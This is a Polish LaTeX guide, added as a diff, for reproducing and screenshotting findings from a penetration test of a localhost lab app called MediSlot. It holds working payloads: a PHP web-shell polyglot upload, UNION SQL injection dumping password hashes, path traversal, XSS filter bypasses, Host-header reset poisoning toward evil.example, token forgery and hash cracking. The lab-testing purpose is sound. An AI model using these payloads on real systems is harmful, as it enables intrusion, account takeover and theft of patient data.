@@ -1,0 +1,249 @@
+% Stage II: Instrukcja pozyskania dowodów (screenshotów) dla raportu MediSlot
+% Build: pdflatex
+\documentclass[11pt,a4paper]{article}
+
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{lmodern}
+\usepackage[polish]{babel}
+\usepackage[a4paper,margin=2.5cm]{geometry}
+\usepackage{parskip}
+\usepackage{booktabs}
+\usepackage{tabularx}
+\usepackage{array}
+\usepackage{ragged2e}
+\usepackage{enumitem}
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage{fancyhdr}
+\usepackage[hidelinks]{hyperref}
+
+\newcolumntype{L}{>{\RaggedRight\arraybackslash}X}
+\lstset{
+  basicstyle=\ttfamily\footnotesize,
+  breaklines=true,
+  columns=fullflexible,
+  frame=single,
+  framesep=4pt,
+  backgroundcolor=\color{gray!6},
+  keepspaces=true,
+}
+
+\pagestyle{fancy}
+\fancyhf{}
+\fancyhead[L]{MediSlot --- Instrukcja pozyskania dowodów}
+\fancyhead[R]{Etap II}
+\fancyfoot[C]{\thepage}
+\renewcommand{\headrulewidth}{0.4pt}
+
+% Blok pojedynczej pozycji
+\newcommand{\poz}[2]{\bigskip\noindent\textbf{\large #1}\quad\textit{#2}\par\nobreak\smallskip}
+
+\title{\textbf{Instrukcja pozyskania dowodów (zrzutów ekranu)}\\[0.3em]
+\large MediSlot --- Etap II\\[0.2em]
+\normalsize Jak odtworzyć i udokumentować każdy dowód z raportu}
+\author{Zespół \\ Kamil Szkarłat \textbullet{} Bartłomiej Ząbek \textbullet{} Jakub Szkaradek \textbullet{} Radosław Chruściński}
+\date{26.11.2026 r.}
+
+\begin{document}
+\maketitle
+
+\section*{Jak korzystać z tej instrukcji}
+Dokument mapuje każdy identyfikator \texttt{RYS-xx} z raportu (\emph{stage-2-report}) na narzędzie
+i kroki potrzebne do wykonania zrzutu ekranu. Po zrobieniu zrzutu wstaw go w raporcie w miejsce
+odpowiedniego placeholdera, zamieniając \verb|\zrzut{...}{RYS-xx}| na
+\verb|\includegraphics[width=0.92\textwidth]{sciezka/do/RYS-xx.png}|.
+
+\section{Przygotowanie środowiska}
+\begin{enumerate}[leftmargin=1.4cm]
+  \item Uruchom lab i załaduj dane:
+\begin{lstlisting}[language=bash]
+docker compose up -d --build
+docker compose exec php php /srv/db/seed.php   # Windows Git Bash: poprzedz MSYS_NO_PATHCONV=1
+\end{lstlisting}
+  \item Dostępy: aplikacja \url{http://localhost:8080}, Mailhog \url{http://localhost:8025},
+  MinIO konsola \url{http://localhost:9001} (\texttt{minioadmin}/\texttt{minioadmin123}).
+  \item Konta testowe: patrz Załącznik~A raportu.
+  \item \textbf{Burp Suite:} ustaw przeglądarkę na proxy \texttt{127.0.0.1:8080} Burpa
+  \emph{(uwaga: aplikacja też słucha na 8080 --- uruchom Burp na innym porcie, np. 8081, albo użyj
+  wbudowanej przeglądarki Burpa)}. Włącz \emph{Intercept} tylko gdy potrzebny; do PoC wygodniejszy
+  jest \emph{Repeater}.
+  \item \textbf{Logowanie przez curl} (do PoC z wiersza poleceń):
+\begin{lstlisting}[language=bash]
+J=cookies.txt
+curl -s -c $J -b $J http://localhost:8080/login.php -o /dev/null
+curl -s -c $J -b $J --data-urlencode "email=pacjent1@novamed.lab" \
+  --data-urlencode "password=Patient123!" http://localhost:8080/login.php -o /dev/null
+\end{lstlisting}
+\end{enumerate}
+
+\section{Mapa pozycji}
+Pełny przebieg PoC dla każdej podatności jest też w skryptach \texttt{tests/verify-task4.sh},
+\texttt{verify-task5.sh}, \texttt{verify-task6.sh} --- można je uruchomić i zrzucić wynik.
+
+% ---------------------------------------------------------------
+\poz{RYS-ARCH}{nmap / docker --- potwierdzenie portów}
+\textbf{Narzędzie:} \texttt{docker compose ps}, \texttt{nmap}.
+\textbf{Kroki:}
+\begin{lstlisting}[language=bash]
+docker compose ps
+nmap -p 8080,8025,9000,9001,3306,6379 localhost
+\end{lstlisting}
+\textbf{Dowód:} na host otwarte tylko 8080/8025/9000/9001; 3306 (MySQL) i 6379 (Redis) zamknięte.
+
+\poz{RYS-TRIVY}{Trivy --- skan obrazu}
+\textbf{Narzędzie:} Trivy. \textbf{Kroki:}
+\begin{lstlisting}[language=bash]
+docker run --rm -v //var/run/docker.sock:/var/run/docker.sock \
+  aquasec/trivy:latest image --severity LOW,MEDIUM,HIGH,CRITICAL medislot-php:latest
+\end{lstlisting}
+\textbf{Dowód:} tabela z wierszem \texttt{Total: 2588 (LOW: 1013, MEDIUM: 1326, HIGH: 245, CRITICAL: 4)}
+oraz przykładowe CVE 2026.
+
+\poz{RYS-LYNIS}{Lynis --- audyt kontenera}
+\textbf{Narzędzie:} Lynis. \textbf{Kroki:}
+\begin{lstlisting}[language=bash]
+docker run --rm medislot-php:latest sh -c \
+  'apt-get update -qq && apt-get install -y -qq lynis && lynis audit system --quick --no-colors'
+\end{lstlisting}
+\textbf{Dowód:} linie \texttt{Hardening index : 57}, \texttt{Warnings (2)}, \texttt{Suggestions (39)}.
+
+\poz{RYS-01}{curl / przeglądarka --- fingerprint PHP (CVE 2026)}
+\textbf{Narzędzie:} \texttt{curl}, przeglądarka. \textbf{Kroki:}
+\begin{lstlisting}[language=bash]
+curl -sI http://localhost:8080/ | grep -i x-powered-by   # X-Powered-By: PHP/8.3.35
+# oraz otworz http://localhost:8080/phpinfo.php i zrob zrzut naglowka z wersja
+\end{lstlisting}
+\textbf{Dowód:} nagłówek \texttt{X-Powered-By: PHP/8.3.35} oraz \texttt{phpinfo} z wersją 8.3.35
+(poniżej poprawki 8.3.36).
+
+\poz{RYS-02}{Burp Repeater / curl --- upload $\rightarrow$ RCE}
+\textbf{Narzędzie:} Burp Repeater lub \texttt{curl}. \textbf{Kroki:}
+\begin{enumerate}[leftmargin=1.2cm,nosep]
+  \item Zaloguj się jako pacjent. Spróbuj wysłać \texttt{shell.php} (\verb|<?php echo 1;|) ---
+  odpowiedź: \emph{Odrzucono}.
+  \item Spróbuj \texttt{shell.phtml} bez prefiksu --- również \emph{Odrzucono}.
+  \item Wyślij polyglot:
+\begin{lstlisting}[language=bash]
+printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.phtml
+curl -s -b cookies.txt -F "file=@shell.phtml;type=image/gif" http://localhost:8080/upload.php
+# znajdz klucz att-NNNNNN-shell.phtml na stronie /upload.php, nastepnie:
+curl -s "http://localhost:8080/uploads/att-000NNN-shell.phtml?c=id"
+\end{lstlisting}
+\end{enumerate}
+\textbf{Dowód:} trzy odpowiedzi (odrzucenie \texttt{.php}, odrzucenie czystego \texttt{.phtml},
+akceptacja polyglota) + wynik wykonania \texttt{id}.
+
+\poz{RYS-03}{Burp Decoder/Repeater --- IDOR}
+\textbf{Narzędzie:} Burp (Decoder + Repeater). \textbf{Kroki:} jako pacjent otwórz
+\texttt{/note\_view.php}; skopiuj parametr \texttt{ref}, w Decoderze odkoduj (base64url) liczbę,
+zwiększ ją, zakoduj ponownie i wyślij \texttt{/note\_view.php?ref=<nowy>} w Repeaterze.
+\textbf{Dowód:} zwrócona notatka należąca do innego pacjenta.
+
+\poz{RYS-04}{Burp Repeater --- eskalacja roli}
+\textbf{Narzędzie:} Burp Repeater / \texttt{curl}. \textbf{Kroki:}
+\begin{lstlisting}[language=bash]
+curl -s -b cookies.txt --data-urlencode "phone=x" --data-urlencode "role_id=4" \
+  http://localhost:8080/profile_update.php
+curl -s -b cookies.txt http://localhost:8080/dashboard.php | grep -o 'badge-[a-z]*'
+\end{lstlisting}
+\textbf{Dowód:} przed --- \texttt{badge-patient}; po \texttt{role\_id=4} --- \texttt{badge-admin}
+(panel administratora).
+
+\poz{RYS-05}{Przeglądarka / curl --- broken access control}
+\textbf{Narzędzie:} przeglądarka (sesja pacjenta) lub \texttt{curl}. \textbf{Kroki:} zalogowany
+pacjent otwiera \texttt{http://localhost:8080/admin\_users.php}.
+\textbf{Dowód:} pełna lista kont (w tym \texttt{admin@novamed.lab}) bez przekierowania/403.
+
+\poz{RYS-06}{curl / Burp --- path traversal}
+\textbf{Narzędzie:} \texttt{curl} / Burp Repeater. \textbf{Kroki:}
+\begin{lstlisting}[language=bash]
+curl -s -b cookies.txt "http://localhost:8080/download.php?file=../includes/config.php"
+\end{lstlisting}
+\textbf{Dowód:} źródło \texttt{config.php} z \texttt{RESET\_SALT} i danymi DB.
+
+\poz{RYS-07}{Przeglądarka --- stored XSS}
+\textbf{Narzędzie:} przeglądarka (konto lekarza + druga sesja). \textbf{Kroki:} jako lekarz zapisz
+notatkę o treści \verb|<scrscriptipt>alert(7)</scrscriptipt>| (lub \verb|<svg/onload=alert(7)>|);
+otwórz notatkę w innej sesji (np. administrator przez \texttt{?ref=}).
+\textbf{Dowód:} wyskakujący \texttt{alert(7)} / payload w kodzie strony innego użytkownika.
+
+\poz{RYS-08}{Mailhog + curl --- reset hasła i Host injection}
+\textbf{Narzędzie:} \texttt{curl}, Mailhog, (\texttt{md5sum}). \textbf{Kroki:}
+\begin{lstlisting}[language=bash]
+# Host injection:
+curl -s -H "Host: evil.example" --data-urlencode "email=pacjent1@novamed.lab" \
+  http://localhost:8080/reset_request.php
+# obejrzyj link w Mailhog: http://localhost:8025  (host = evil.example)
+# Rekonstrukcja tokenu offline (salt z config.php):
+UID=<id_uzytkownika>; printf "%smedislot-static-salt-2024" "$UID" | md5sum
+# token akceptowany: http://localhost:8080/reset.php?u=$UID&token=<md5>
+\end{lstlisting}
+\textbf{Dowód:} wiadomość w Mailhog z linkiem na \texttt{evil.example}; strona \texttt{reset.php}
+akceptuje odtworzony token (nie „Nieprawidłowy link resetu”).
+
+\poz{RYS-10}{sqlmap / Burp --- SQL injection}
+\textbf{Narzędzie:} \texttt{curl}/Burp (ręcznie) oraz \texttt{sqlmap} (potwierdzenie). \textbf{Kroki:}
+\begin{lstlisting}[language=bash]
+# recznie (dump password_hash):
+curl -s -b cookies.txt --get \
+  --data-urlencode "min_id=0/**/UNIUNIONON/**/SELECT/**/email,password_hash,role,full_name/**/FROM/**/users" \
+  http://localhost:8080/search.php
+# sqlmap (uzyj ciasteczka sesji zalogowanego konta):
+sqlmap -u "http://localhost:8080/search.php?min_id=1" --cookie="PHPSESSID=..." -p min_id --batch
+\end{lstlisting}
+\textbf{Dowód:} skróty \texttt{password\_hash} w wyniku / raport \texttt{sqlmap} z potwierdzoną iniekcją.
+
+\poz{RYS-11}{aws-cli / mc / curl --- publiczny bucket}
+\textbf{Narzędzie:} \texttt{curl} (anonimowo), \texttt{mc} lub \texttt{aws-cli}. \textbf{Kroki:}
+\begin{lstlisting}[language=bash]
+curl -s -o out.pdf -w "%{http_code}\n" \
+  http://localhost:9000/medislot-attachments/pacjent1/wynik-krwi-2026.pdf
+\end{lstlisting}
+\textbf{Dowód:} \texttt{200 OK} bez uwierzytelnienia i pobrany obiekt.
+
+\poz{RYS-12}{Burp --- CSRF}
+\textbf{Narzędzie:} Burp Repeater (lub strona PoC). \textbf{Kroki:} wyślij POST do
+\texttt{/admin\_role.php} z ciasteczkiem sesji, nagłówkiem \texttt{Origin: http://evil.example}
+i bez tokenu, parametry \texttt{id=<ofiara>\&role=doctor}.
+\textbf{Dowód:} rola zmieniona mimo obcego \texttt{Origin} i braku tokenu CSRF.
+
+\poz{RYS-09}{DevTools + john/hashcat --- sesje i MD5}
+\textbf{Narzędzie:} DevTools przeglądarki, \texttt{john}/\texttt{hashcat}. \textbf{Kroki:} w DevTools
+pokaż ciasteczko \texttt{PHPSESSID} bez flagi \texttt{HttpOnly}; skróty MD5 ze zrzutu (RYS-10) zapisz
+do pliku i uruchom:
+\begin{lstlisting}[language=bash]
+john --format=raw-md5 hashes.txt            # lub: hashcat -m 0 hashes.txt rockyou.txt
+\end{lstlisting}
+\textbf{Dowód:} cookie bez \texttt{HttpOnly}; złamane hasło(a) z MD5.
+
+\poz{RYS-15}{Burp Intruder --- enumeracja kont}
+\textbf{Narzędzie:} Burp Intruder. \textbf{Kroki:} atakuj \texttt{/login.php} listą e-maili;
+porównaj komunikaty „Nie znaleziono konta…” vs „Nieprawidłowe hasło…”.
+\textbf{Dowód:} różne odpowiedzi ujawniające istnienie konta.
+
+\poz{RYS-16}{curl / nikto --- ujawnienie informacji}
+\textbf{Narzędzie:} \texttt{curl -I}, \texttt{nikto}. \textbf{Kroki:}
+\begin{lstlisting}[language=bash]
+curl -sI http://localhost:8080/login.php   # X-Powered-By, Server; brak CSP/HSTS/X-Frame-Options
+# oraz http://localhost:8080/phpinfo.php
+nikto -h http://localhost:8080
+\end{lstlisting}
+\textbf{Dowód:} nagłówki wersji obecne, nagłówki bezpieczeństwa brak; dostępne \texttt{phpinfo}.
+
+\poz{RYS-19}{redis-cli / git --- Redis bez AUTH i sekrety}
+\textbf{Narzędzie:} \texttt{redis-cli} (w sieci Compose), \texttt{git}. \textbf{Kroki:}
+\begin{lstlisting}[language=bash]
+docker compose exec redis redis-cli PING        # PONG (bez AUTH)
+docker compose exec redis redis-cli KEYS '*'     # klucze sesji
+git show HEAD:.env                               # sekrety w repo
+\end{lstlisting}
+\textbf{Dowód:} \texttt{PONG} i lista kluczy sesji bez hasła; zawartość \texttt{.env} w repozytorium.
+
+\poz{RYS-ROE}{Dokumentacja --- kontakt RoE}
+\textbf{Narzędzie:} kanał uzgodniony (Teams / wiadomość w repo). \textbf{Kroki:} w chwili
+potwierdzenia ustalenia Critical (RCE \#2) zrób zrzut notatki/wiadomości z datą, godziną, treścią
+zgłoszenia do osoby RoE (Bartłomiej Ząbek) i potwierdzeniem odbioru.
+\textbf{Dowód:} zrzut kanału kontaktu zgodny z tabelą w rozdz. „Ustalenie Critical --- kontakt z RoE”.
+
+\end{document}
